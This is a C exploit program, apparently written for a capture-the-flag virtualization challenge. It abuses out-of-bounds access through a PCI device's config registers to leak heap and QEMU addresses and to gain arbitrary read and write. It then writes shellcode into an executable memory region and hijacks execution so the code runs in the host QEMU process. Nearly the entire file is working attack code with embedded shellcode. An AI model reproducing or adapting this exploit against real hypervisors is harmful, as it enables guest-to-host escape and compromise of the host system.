#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdint.h>
#include <stdlib.h>

#define ull unsigned long long

void init(){
    setvbuf(stdout, 0, 2, 0);
}

char output[4] = {0,0,0,0};
char* p32(uint value) {
    for (int i = 0; i < 4; i++) {
        output[i] = (char)(value >> (i*8)) & 0xFF;
    }
    return output;
}

int fd;
void pci_write(uint data, int len, int addr){
    pwrite(fd, p32(data), len, addr);
}

void pci_read(ull* data, int len, int addr){
    pread(fd, data, len, addr);
}

void write8(ull data, uint offset){
    pci_write(offset, 4, 0xe0);
    pci_write(data%0x100000000, 4, 0xe4);
    pci_write(offset + 1, 4, 0xe0);
    pci_write(data >> (8*4), 4, 0xe4);
}

ssize_t arb_read(ull addr, void *buf, ssize_t len) {
    write8(addr, -656);
    return pread(fd, buf, len, 0);
}

void func() {
    asm(".intel_syntax noprefix;"
"mov rdi, 0x06eb9000000002b8;"
"mov rsi, 0x06eb909090676a66;"
"mov rdx, 0x06eb9090616c6866;"
"mov r15, 0x06eb9090662f6866;"
"mov r14, 0x06eb90f631e78748;"
"mov r13, 0x06eb9090050fd231;"
"mov r12, 0x06eb90909090c689;"
"mov r11, 0x06eb9000000001bf;"
"mov r10, 0x06eb90c2894928b0;"
"mov r9, 0x06eb90909090050f;"
    ".att_syntax prefix;");
}

int main() {
    ull leak;
    init();
    fd = open("/sys/devices/pci0000:00/0000:00:04.0/config", O_RDWR);
    printf("config fd: %d\n", fd);
    if (fd == -1) {
        perror("open failed");
        return EXIT_FAILURE;
    }
    // leaking the heap
    int offset = -8;
    pci_write((offset)/4, 4, 0xe0);
    pci_read(&leak, 4, 0xe4);
    pci_write(((offset)/4) + 1, 4, 0xe0);
    pci_read((ull *)((char*)&leak+4), 4, 0xe4);
    ull heap = leak + 0xae8;
    printf("[+] heap leak: %p\n", heap);

    // leaking the qemu
    offset = -0x1f00;
    pci_write((offset)/4, 4, 0xe0);
    ull qemu;
    pci_read(&qemu, 4, 0xe4);
    pci_write(((offset)/4) + 1, 4, 0xe0);
    pci_read((ull *)((char*)&qemu+4), 4, 0xe4);
    qemu -= 0x689790;
    printf("[+] qemu leak: %p\n", qemu);

    const uint32_t sc[18] = 
    {
        0x50ec8348, 0x0101b848, 0x01010101, 0x48500101,
        0x6d672eb8, 0x01016660, 0x04314801, 0x58026a24,
        0x31e78948, 0x3140b6d2, 0x48050ff6, 0x8948d429,
        0x48c031c7, 0x050fe689, 0x6ac28948, 0x016a5801,
        0xe689485f, 0x0000050f
    };

    // New Code - trying out `low bob rondo` method. 
    ull start_aligned = qemu + 0x1803650;
    ull RWX_region;
    arb_read(start_aligned, &RWX_region, 8);
    printf("[+] RWX region leak: %p\n", RWX_region);

    write8(RWX_region, -656);

    // Writing the shellcode into RWX
    for (int i=0;i<18;i++){
        pci_write(sc[i], 4, 0x44+(4*i));
    }

    write8(RWX_region + 0x44, -378);

    ull bob;
    pci_read(&bob, 1, 0xe0);
}

/*
crash: pci_host_config_read_common+276
*/